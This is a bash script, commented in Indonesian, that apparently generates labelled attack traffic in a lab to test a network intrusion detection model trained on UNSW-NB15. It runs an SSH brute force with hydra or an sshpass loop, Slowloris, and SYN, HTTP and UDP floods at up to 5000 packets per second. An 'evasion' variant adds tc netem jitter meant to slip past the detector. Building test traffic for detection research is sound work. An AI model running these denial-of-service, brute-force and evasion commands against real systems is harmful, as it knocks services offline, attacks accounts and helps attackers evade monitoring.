#!/bin/bash
# ============================================================
# T10 UNSW-NB15 â€” Skenario serangan (Fase 2: DETEKSI) dari Attacker.
# Pola NIDS-01 (~7 menit): benign -> SSH brute -> Slowloris -> SYN flood -> benign.
# Varian:
#   clean       (default) : brute + slowloris + SYN flood standar
#   evasion               : sama + perturbasi level-paket (tc netem)
#   volumetric            : serangan LAJU-TINGGI (DoS/flood) agar profil flow
#                           (src_load/dst_load byte&paket per-detik) SEPADAN dengan
#                           kelas DoS/Generic UNSW-NB15 (train src_load~2.5e5,
#                           dst_load~1.5e4). clean/evasion menghasilkan flow laju
#                           rendah (brute/slowloris lambat) sehingga di luar
#                           distribusi attack yang dipelajari model.
# ============================================================
# Usage (di Attacker):
#   ./attack_scenario.sh <TARGET_PRIVATE_IP> [clean|evasion|volumetric]
set -x
TARGET=$1
VARIANT=${2:-clean}
[ -z "$TARGET" ] && { echo "Usage: $0 <TARGET_IP> [clean|evasion|volumetric]"; exit 1; }
IFACE=$(ip -o -4 route show to default | awk '{print $5}' | head -1)

if [ "$VARIANT" = "evasion" ]; then
  echo "[EVASION] aktifkan jitter (ubah IAT) via tc netem"
  sudo tc qdisc add dev "$IFACE" root netem delay 10ms 5ms || true
fi

if [ "$VARIANT" = "volumetric" ]; then
  # ---- Varian VOLUMETRIC: laju tinggi (byte/detik & paket/detik besar) ----
  # Tujuan: profil flow mirip DoS/Generic UNSW (src_load/dst_load tinggi).
  echo "[$(date +%T)] Fase 0: benign warm-up (60s)"
  for i in $(seq 1 60); do curl -s "http://$TARGET/" >/dev/null; sleep 1; done

  echo "[$(date +%T)] Fase 1: SYN flood AGRESIF (120s, rate 5000/s)"
  # rate tinggi -> banyak paket/detik -> src_load besar
  sudo timeout 120 nping --tcp --flags SYN --rate 5000 -p 80 -c 600000 "$TARGET" 2>&1 | tail -3 || true

  echo "[$(date +%T)] Fase 2: HTTP flood cepat (120s, banyak request paralel + payload)"
  # request cepat tanpa jeda, paralel -> byte/detik & paket/detik tinggi
  timeout 120 bash -c '
    end=$((SECONDS+120))
    while [ $SECONDS -lt $end ]; do
      for j in $(seq 1 20); do
        curl -s -o /dev/null "http://'"$TARGET"'/?q=$RANDOM$RANDOM$RANDOM$RANDOM" &
      done
      wait
    done' 2>&1 | tail -2 || true

  echo "[$(date +%T)] Fase 3: UDP flood (60s, rate 5000/s)"
  sudo timeout 60 nping --udp --rate 5000 -p 53 -c 300000 --data-length 512 "$TARGET" 2>&1 | tail -3 || true

  echo "[$(date +%T)] Fase 4: benign cool-down (60s)"
  for i in $(seq 1 60); do curl -s "http://$TARGET/" >/dev/null; sleep 1; done
  echo "[$(date +%T)] SELESAI ($VARIANT). Stop capture di Target, lalu proses di Analyzer."
  exit 0
fi

echo "[$(date +%T)] Fase 0: benign warm-up (60s)"
for i in $(seq 1 60); do curl -s "http://$TARGET/" >/dev/null; sleep 1; done

echo "[$(date +%T)] Fase 1: SSH brute-force (120s)"
# hydra bila tersedia; jika tidak, loop ssh gagal sbg proxy brute-force
if command -v hydra >/dev/null; then
  timeout 120 hydra -l testuser -P /opt/passwords.txt -t 4 "$TARGET" ssh 2>&1 | tail -2
else
  timeout 120 bash -c "while true; do sshpass -p wrong ssh -o StrictHostKeyChecking=no testuser@$TARGET true 2>/dev/null; done" || true
fi

echo "[$(date +%T)] Fase 2: Slowloris (120s)"
timeout 120 slowloris "$TARGET" -p 80 -s 100 2>&1 | tail -2 || true

echo "[$(date +%T)] Fase 3: SYN flood (60s, rate 200/s)"
sudo timeout 60 nping --tcp --flags SYN --rate 200 -p 80 -c 12000 "$TARGET" 2>&1 | tail -3 || true

echo "[$(date +%T)] Fase 4: benign cool-down (60s)"
for i in $(seq 1 60); do curl -s "http://$TARGET/" >/dev/null; sleep 1; done

if [ "$VARIANT" = "evasion" ]; then
  sudo tc qdisc del dev "$IFACE" root netem || true
fi
echo "[$(date +%T)] SELESAI ($VARIANT). Stop capture di Target, lalu proses di Analyzer."
